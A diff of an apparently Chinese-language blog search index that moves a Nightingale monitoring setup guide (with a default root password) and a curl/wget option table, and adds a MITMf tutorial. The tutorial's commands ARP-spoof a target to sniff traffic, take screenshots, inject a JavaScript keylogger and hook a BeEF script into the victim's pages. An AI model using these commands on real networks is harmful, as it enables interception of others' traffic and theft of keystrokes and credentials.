@@ -4,18 +4,18 @@
   
     
     <entry>
-      <title>centos7部署滴滴夜莺监控系统</title>
-      <link href="2020/12/04/centos7%E9%83%A8%E7%BD%B2%E6%BB%B4%E6%BB%B4%E5%A4%9C%E8%8E%BA%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F/"/>
-      <url>2020/12/04/centos7%E9%83%A8%E7%BD%B2%E6%BB%B4%E6%BB%B4%E5%A4%9C%E8%8E%BA%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F/</url>
+      <title>http请求工具详解</title>
+      <link href="2020/12/04/http%E8%AF%B7%E6%B1%82%E5%B7%A5%E5%85%B7%E8%AF%A6%E8%A7%A3/"/>
+      <url>2020/12/04/http%E8%AF%B7%E6%B1%82%E5%B7%A5%E5%85%B7%E8%AF%A6%E8%A7%A3/</url>
       
-        <content type="html"><![CDATA[<h3 id="夜莺github："><a href="#夜莺github：" class="headerlink" title="夜莺github："></a>夜莺github：</h3><p><code>https://github.com/didi/nightingale</code></p><h3 id="官方介绍："><a href="#官方介绍：" class="headerlink" title="官方介绍："></a>官方介绍：</h3><blockquote><p>Nightingale 是一套衍生自 Open-Falcon 的互联网监控解决方案，融入了部分滴滴生产环境的最佳实践，灵活易用，稳定可靠，是一个生产环境直接可用的版本 :-)</p></blockquote><h3 id="使用手册："><a href="#使用手册：" class="headerlink" title="使用手册："></a>使用手册：</h3><p><code>https://n9e.didiyun.com/</code></p><h3 id="详细部署过程"><a href="#详细部署过程" class="headerlink" title="详细部署过程"></a>详细部署过程</h3><h4 id="server端部署"><a href="#server端部署" class="headerlink" title="server端部署"></a>server端部署</h4><h5 id="部署docker"><a href="#部署docker" class="headerlink" title="部署docker"></a>部署docker</h5><blockquote><p>自行百度方法</p></blockquote><h5 id="下载docker-compose并执行"><a href="#下载docker-compose并执行" class="headerlink" title="下载docker-compose并执行"></a>下载docker-compose并执行</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -L https://github.com/docker/compose/releases/download/1.25.0-rc4/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</span><br><span class="line">chmod  +x  /usr/local/bin/docker-compos</span><br><span class="line">cd  nightingale-3.3.0/dockerfiles &amp;&amp; docker-compose up -d</span><br></pre></td></tr></table></figure><h5 id="安装完成后访问"><a href="#安装完成后访问" class="headerlink" title="安装完成后访问"></a>安装完成后访问</h5><p><img src="https://img-blog.csdnimg.cn/20201130091801257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>默认账号: root<br>默认密码: root.2020</p></blockquote><h4 id="agent端部署"><a href="#agent端部署" class="headerlink" title="agent端部署"></a>agent端部署</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://116.85.64.82/n9e.tar.gz </span><br><span class="line"><span class="meta">#</span><span class="bash"> 下载资源，这是一个完整的代码包，我们只需要其中部分文件。</span></span><br><span class="line">mkdir data</span><br><span class="line">tar xf n9e.tar.gz -C data &amp;&amp; cd data</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>目录结构如下：<br><img src="https://img-blog.csdnimg.cn/2020113009383625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>将 <strong>control</strong>、 <strong>n9e-agent</strong>、 <strong>etc/address.yml</strong>， <strong>/etc/agent.yml</strong>、 <strong>/etc/identity.yml</strong> 打包 拷贝到**/home/n9e/** 这个目录下，这里要注意目录结构，其中logs和meta是后续自动生成的。<br><img src="https://img-blog.csdnimg.cn/20201130094200971.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></blockquote><h5 id="修改server端配置"><a href="#修改server端配置" class="headerlink" title="修改server端配置"></a>修改server端配置</h5><blockquote><p>编辑address.yml 将地址127.0.0.1 修改为主服务器端ip地址<br><img src="https://img-blog.csdnimg.cn/20201130094449905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></blockquote><h5 id="配置启动脚本"><a href="#配置启动脚本" class="headerlink" title="配置启动脚本"></a>配置启动脚本</h5><blockquote><p>在我们刚才解压开的目录中etc/service 下有agent.service 文件，将他拷贝到相应目录下</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp agent.service &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;</span><br><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201130094803878.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>启动成功后便可以开始检测了</p></blockquote><h5 id="检测安装"><a href="#检测安装" class="headerlink" title="检测安装"></a>检测安装</h5><p><img src="https://img-blog.csdnimg.cn/20201130094911318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201130094931418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
+        <content type="html"><![CDATA[<h2 id="curl使用方法"><a href="#curl使用方法" class="headerlink" title="curl使用方法"></a><center>curl使用方法</center></h2><table><thead><tr><th>参数</th><th>说明</th><th>例子</th></tr></thead><tbody><tr><td>-A</td><td>设置user-agent</td><td>curl -A “Chrome” <a href="http://www.baidu.com/">http://www.baidu.com</a></td></tr><tr><td>-X</td><td>用执行方法请求</td><td>curl -X POST <a href="http://httpbin.org/post">http://httpbin.org/post</a></td></tr><tr><td>-I</td><td>只返回请求的头信息</td><td>-d a=1 -d b=2 -d c=3<br>-d “a=1&amp;b=2&amp;c=3”<br>-d @filename</td></tr><tr><td>-O</td><td>下载文件并以远程文件名保存</td><td></td></tr><tr><td>-o</td><td>下载文件并以指定文件名保存</td><td>curl -o fox.png <a href="http://bin.org/image/png">http://bin.org/image/png</a></td></tr><tr><td>-L</td><td>跟随重定向请求</td><td>curl -IL <a href="https://baidu.com/">https://baidu.com</a></td></tr><tr><td>-H</td><td>设置头信息</td><td>curl -o image.webp -H “accept:image/webp” <a href="http://httpbin.org/image">http://httpbin.org/image</a></td></tr><tr><td>-k</td><td>允许发起不安全的ssl请求</td><td></td></tr><tr><td>-b</td><td>设置cookies</td><td>curl -b a=hello <a href="http://httpbin.org/cookies">http://httpbin.org/cookies</a></td></tr></tbody></table><h2 id="wget使用方法"><a href="#wget使用方法" class="headerlink" title="wget使用方法"></a><center>wget使用方法</center></h2><table><thead><tr><th>参数</th><th>说明</th><th>例子</th></tr></thead><tbody><tr><td>-O</td><td>以指定文件名保存下载文件</td><td>wget -O <a href="http://www.baidu.com/index.php">http://www.baidu.com/index.php</a></td></tr><tr><td>–limit-rate</td><td>以制定的速度下载文件</td><td>wget –limit-rate=500k</td></tr><tr><td>-c</td><td>断点续传</td><td></td></tr><tr><td>-b</td><td>后台下载</td><td></td></tr><tr><td>-U</td><td>设置User-Agent</td><td></td></tr><tr><td>–mirror</td><td>镜像下载某个网站</td><td></td></tr><tr><td>-p</td><td>下载页面中的所有相关资源</td><td></td></tr><tr><td>-r</td><td>递归下载所有网页中的链接</td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table>]]></content>
       
       
       <categories>
           
           <category> operations </category>
           
-          <category> 监控 </category>
+          <category> development </category>
           
       </categories>
       
@@ -24,7 +24,9 @@
             
             <tag> 运维 </tag>
             
-            <tag> 监控 </tag>
+            <tag> 网络请求 </tag>
+            
+            <tag> 开发 </tag>
             
         </tags>
       
@@ -389,6 +391,35 @@
     
     
     <entry>
+      <title>centos7部署滴滴夜莺监控系统</title>
+      <link href="2020/12/04/centos7%E9%83%A8%E7%BD%B2%E6%BB%B4%E6%BB%B4%E5%A4%9C%E8%8E%BA%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F/"/>
+      <url>2020/12/04/centos7%E9%83%A8%E7%BD%B2%E6%BB%B4%E6%BB%B4%E5%A4%9C%E8%8E%BA%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F/</url>
+      
+        <content type="html"><![CDATA[<h3 id="夜莺github："><a href="#夜莺github：" class="headerlink" title="夜莺github："></a>夜莺github：</h3><p><code>https://github.com/didi/nightingale</code></p><h3 id="官方介绍："><a href="#官方介绍：" class="headerlink" title="官方介绍："></a>官方介绍：</h3><blockquote><p>Nightingale 是一套衍生自 Open-Falcon 的互联网监控解决方案，融入了部分滴滴生产环境的最佳实践，灵活易用，稳定可靠，是一个生产环境直接可用的版本 :-)</p></blockquote><h3 id="使用手册："><a href="#使用手册：" class="headerlink" title="使用手册："></a>使用手册：</h3><p><code>https://n9e.didiyun.com/</code></p><h3 id="详细部署过程"><a href="#详细部署过程" class="headerlink" title="详细部署过程"></a>详细部署过程</h3><h4 id="server端部署"><a href="#server端部署" class="headerlink" title="server端部署"></a>server端部署</h4><h5 id="部署docker"><a href="#部署docker" class="headerlink" title="部署docker"></a>部署docker</h5><blockquote><p>自行百度方法</p></blockquote><h5 id="下载docker-compose并执行"><a href="#下载docker-compose并执行" class="headerlink" title="下载docker-compose并执行"></a>下载docker-compose并执行</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -L https://github.com/docker/compose/releases/download/1.25.0-rc4/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</span><br><span class="line">chmod  +x  /usr/local/bin/docker-compos</span><br><span class="line">cd  nightingale-3.3.0/dockerfiles &amp;&amp; docker-compose up -d</span><br></pre></td></tr></table></figure><h5 id="安装完成后访问"><a href="#安装完成后访问" class="headerlink" title="安装完成后访问"></a>安装完成后访问</h5><p><img src="https://img-blog.csdnimg.cn/20201130091801257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>默认账号: root<br>默认密码: root.2020</p></blockquote><h4 id="agent端部署"><a href="#agent端部署" class="headerlink" title="agent端部署"></a>agent端部署</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://116.85.64.82/n9e.tar.gz </span><br><span class="line"><span class="meta">#</span><span class="bash"> 下载资源，这是一个完整的代码包，我们只需要其中部分文件。</span></span><br><span class="line">mkdir data</span><br><span class="line">tar xf n9e.tar.gz -C data &amp;&amp; cd data</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>目录结构如下：<br><img src="https://img-blog.csdnimg.cn/2020113009383625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>将 <strong>control</strong>、 <strong>n9e-agent</strong>、 <strong>etc/address.yml</strong>， <strong>/etc/agent.yml</strong>、 <strong>/etc/identity.yml</strong> 打包 拷贝到**/home/n9e/** 这个目录下，这里要注意目录结构，其中logs和meta是后续自动生成的。<br><img src="https://img-blog.csdnimg.cn/20201130094200971.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></blockquote><h5 id="修改server端配置"><a href="#修改server端配置" class="headerlink" title="修改server端配置"></a>修改server端配置</h5><blockquote><p>编辑address.yml 将地址127.0.0.1 修改为主服务器端ip地址<br><img src="https://img-blog.csdnimg.cn/20201130094449905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></blockquote><h5 id="配置启动脚本"><a href="#配置启动脚本" class="headerlink" title="配置启动脚本"></a>配置启动脚本</h5><blockquote><p>在我们刚才解压开的目录中etc/service 下有agent.service 文件，将他拷贝到相应目录下</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp agent.service &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;</span><br><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201130094803878.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>启动成功后便可以开始检测了</p></blockquote><h5 id="检测安装"><a href="#检测安装" class="headerlink" title="检测安装"></a>检测安装</h5><p><img src="https://img-blog.csdnimg.cn/20201130094911318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201130094931418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> operations </category>
+          
+          <category> 监控 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 运维 </tag>
+            
+            <tag> 监控 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>NMAP 嗅探工具</title>
       <link href="2020/12/04/NMAP_%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E8%AF%A6%E8%A7%A3/"/>
       <url>2020/12/04/NMAP_%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E8%AF%A6%E8%A7%A3/</url>
@@ -397,8 +428,6 @@
       
       
       <categories>
-          
-          <category> operations </category>
           
           <category> 极客 </category>
           
@@ -410,37 +439,6 @@
             <tag> 运维 </tag>
             
             <tag> 极客 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>http请求工具详解</title>
-      <link href="2020/12/04/http%E8%AF%B7%E6%B1%82%E5%B7%A5%E5%85%B7%E8%AF%A6%E8%A7%A3/"/>
-      <url>2020/12/04/http%E8%AF%B7%E6%B1%82%E5%B7%A5%E5%85%B7%E8%AF%A6%E8%A7%A3/</url>
-      
-        <content type="html"><![CDATA[<h2 id="curl使用方法"><a href="#curl使用方法" class="headerlink" title="curl使用方法"></a><center>curl使用方法</center></h2><table><thead><tr><th>参数</th><th>说明</th><th>例子</th></tr></thead><tbody><tr><td>-A</td><td>设置user-agent</td><td>curl -A “Chrome” <a href="http://www.baidu.com/">http://www.baidu.com</a></td></tr><tr><td>-X</td><td>用执行方法请求</td><td>curl -X POST <a href="http://httpbin.org/post">http://httpbin.org/post</a></td></tr><tr><td>-I</td><td>只返回请求的头信息</td><td>-d a=1 -d b=2 -d c=3<br>-d “a=1&amp;b=2&amp;c=3”<br>-d @filename</td></tr><tr><td>-O</td><td>下载文件并以远程文件名保存</td><td></td></tr><tr><td>-o</td><td>下载文件并以指定文件名保存</td><td>curl -o fox.png <a href="http://bin.org/image/png">http://bin.org/image/png</a></td></tr><tr><td>-L</td><td>跟随重定向请求</td><td>curl -IL <a href="https://baidu.com/">https://baidu.com</a></td></tr><tr><td>-H</td><td>设置头信息</td><td>curl -o image.webp -H “accept:image/webp” <a href="http://httpbin.org/image">http://httpbin.org/image</a></td></tr><tr><td>-k</td><td>允许发起不安全的ssl请求</td><td></td></tr><tr><td>-b</td><td>设置cookies</td><td>curl -b a=hello <a href="http://httpbin.org/cookies">http://httpbin.org/cookies</a></td></tr></tbody></table><h2 id="wget使用方法"><a href="#wget使用方法" class="headerlink" title="wget使用方法"></a><center>wget使用方法</center></h2><table><thead><tr><th>参数</th><th>说明</th><th>例子</th></tr></thead><tbody><tr><td>-O</td><td>以指定文件名保存下载文件</td><td>wget -O <a href="http://www.baidu.com/index.php">http://www.baidu.com/index.php</a></td></tr><tr><td>–limit-rate</td><td>以制定的速度下载文件</td><td>wget –limit-rate=500k</td></tr><tr><td>-c</td><td>断点续传</td><td></td></tr><tr><td>-b</td><td>后台下载</td><td></td></tr><tr><td>-U</td><td>设置User-Agent</td><td></td></tr><tr><td>–mirror</td><td>镜像下载某个网站</td><td></td></tr><tr><td>-p</td><td>下载页面中的所有相关资源</td><td></td></tr><tr><td>-r</td><td>递归下载所有网页中的链接</td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table>]]></content>
-      
-      
-      <categories>
-          
-          <category> operations </category>
-          
-          <category> development </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 运维 </tag>
-            
-            <tag> 网络请求 </tag>
-            
-            <tag> 开发 </tag>
             
         </tags>
       
@@ -797,6 +795,33 @@
             <tag> 存储 </tag>
             
             <tag> 数据库 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>mitmf框架安装与使用</title>
+      <link href="2020/12/04/mitmf_%E6%A1%86%E6%9E%B6%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
+      <url>2020/12/04/mitmf_%E6%A1%86%E6%9E%B6%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
+      
+        <content type="html"><![CDATA[<h1 id="安装mitmf"><a href="#安装mitmf" class="headerlink" title="安装mitmf"></a>安装mitmf</h1><blockquote><p>环境介绍：<br>kali 2019-04<br>python 2.7</p></blockquote><h3 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</span><br><span class="line">apt-get install libxml2-dev </span><br><span class="line"># 如果报错，可以自行百度更换源</span><br></pre></td></tr></table></figure><h3 id="克隆源代码"><a href="#克隆源代码" class="headerlink" title="克隆源代码"></a>克隆源代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;byt3bl33d3r&#x2F;MITMf</span><br><span class="line">cd MITMf &amp;&amp; git submodule init &amp;&amp; git submodule update --recursive</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><h3 id="安装-twisted"><a href="#安装-twisted" class="headerlink" title="安装 twisted"></a>安装 twisted</h3><blockquote><p>安装 twisted是为了完善功能</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;twistedmatrix.com&#x2F;Releases&#x2F;Twisted&#x2F;15.5&#x2F;Twisted-15.5.0.tar.bz2</span><br><span class="line">pip install .&#x2F;Twisted-15.5.0.tar.bz2</span><br></pre></td></tr></table></figure><h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><h6 id="数据包嗅探"><a href="#数据包嗅探" class="headerlink" title="数据包嗅探"></a>数据包嗅探</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python mitmf.py -i eth0 --hsts --spoof --arp --gateway 网关 --target 渗透ip</span><br></pre></td></tr></table></figure><h6 id="恶搞（图片调转180度）"><a href="#恶搞（图片调转180度）" class="headerlink" title="恶搞（图片调转180度）"></a>恶搞（图片调转180度）</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;mitmf.py --spoof --arp -i eth0 --gateway 网关 --target 渗透ip --upsidedownternet</span><br></pre></td></tr></table></figure><h6 id="图片替换"><a href="#图片替换" class="headerlink" title="图片替换"></a>图片替换</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;mitmf.py --spoof --arp -i eth0 --gateway 网关 --target 渗透ip --imgrand --img-dir &#x2F;root&#x2F;MITMf&#x2F;Photo      </span><br></pre></td></tr></table></figure><h6 id="屏幕截图"><a href="#屏幕截图" class="headerlink" title="屏幕截图"></a>屏幕截图</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mitmf.py -i eth0 --spoof --arp --gateway 网关 --target 渗透ip --screen</span><br></pre></td></tr></table></figure><h6 id="键盘获取"><a href="#键盘获取" class="headerlink" title="键盘获取"></a>键盘获取</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;mitmf.py --spoof --arp -i eth0 --gateway 网关 --target 渗透ip --jskeylogger</span><br></pre></td></tr></table></figure><h6 id="与beef结合使用"><a href="#与beef结合使用" class="headerlink" title="与beef结合使用"></a>与beef结合使用</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;mitmf.py --spoof --arp -i eth0 --gateway 网关 --target 渗透ip --inject --js-url h</span><br><span class="line">ttp:&#x2F;&#x2F;127.0.0.1:3000&#x2F;hook.js</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 极客 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 运维 </tag>
+            
+            <tag> 渗透 </tag>
             
         </tags>
       
